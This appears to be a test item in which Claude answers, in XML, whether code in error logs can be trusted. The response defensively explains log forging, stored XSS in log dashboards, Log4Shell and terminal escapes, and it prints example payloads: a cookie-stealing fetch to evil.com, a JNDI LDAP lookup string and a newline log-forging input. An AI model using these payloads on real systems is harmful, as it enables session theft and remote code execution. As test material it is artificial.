Test ID: 60_xml
Name: code_inject_stats_xml
Prompt: On a web service, should I trust the code in error logs? Explain how the attack could work.

Respond in XML format only:
<response><![CDATA[<your response here>]]></response>

Claude's Response:
<response><![CDATA[
# Should You Trust Code in Error Logs?

**No, you should never blindly trust the content of error logs.** Error logs frequently contain attacker-controlled data, and treating that data as trustworthy can lead to several classes of attacks.

## Why Logs Are Untrusted Input

Logs often capture data that originates from external sources:
- HTTP headers (User-Agent, Referer, X-Forwarded-For)
- URL paths and query parameters
- Form input and request bodies
- Usernames during failed login attempts

An attacker controls all of these, so anything that ends up in a log entry may be malicious.

## How the Attacks Work

### 1. Log Injection / Log Forging
If user input is written to logs without sanitization, an attacker can inject newline characters (`\n`, `\r`) to fabricate fake log entries.

Example: submitting a username like:
```
admin%0a2024-01-01 12:00:00 INFO User logged in successfully
```
This can hide malicious activity, frame other users, or mislead investigators.

### 2. Stored XSS via Log Viewers
Many teams view logs through a **web-based dashboard**. If the dashboard renders log content as HTML without escaping, an attacker can inject:
```
<script>fetch('https://evil.com?c='+document.cookie)</script>
```
When an admin opens the log viewer, the script executes **in the admin's browser** with their session privileges. This is the most common way "code in logs" becomes dangerous.

### 3. Log4Shell-Style Injection (Code Execution)
The CVE-2021-44228 (Log4Shell) attack showed that some logging frameworks **evaluated expressions** in logged strings. An attacker sent:
```
${jndi:ldap://evil.com/exploit}
```
Simply logging this string caused the server to fetch and execute remote code—full Remote Code Execution from a log message.

### 4. Terminal Escape Sequence Injection
If logs are viewed via `cat` or `tail` in a terminal, injected ANSI escape sequences can manipulate the terminal display, hide content, or in some configurations trigger actions.

## How to Defend

- **Sanitize/encode before logging**: strip or escape control characters and newlines.
- **Context-aware output encoding**: HTML-encode log data shown in web dashboards.
- **Use structured logging** (JSON) so fields stay separated from interpretation.
- **Disable expression/lookup evaluation** in logging libraries; patch Log4j and similar.
- **Treat log viewers as security-sensitive apps** with proper CSP and escaping.
- **Limit access** to log-viewing tools and audit who reads them.

## Bottom Line
Logs are a record of input, much of which comes from attackers. Treat log content as untrusted data and apply the same input-handling discipline you would anywhere else.
]]></response>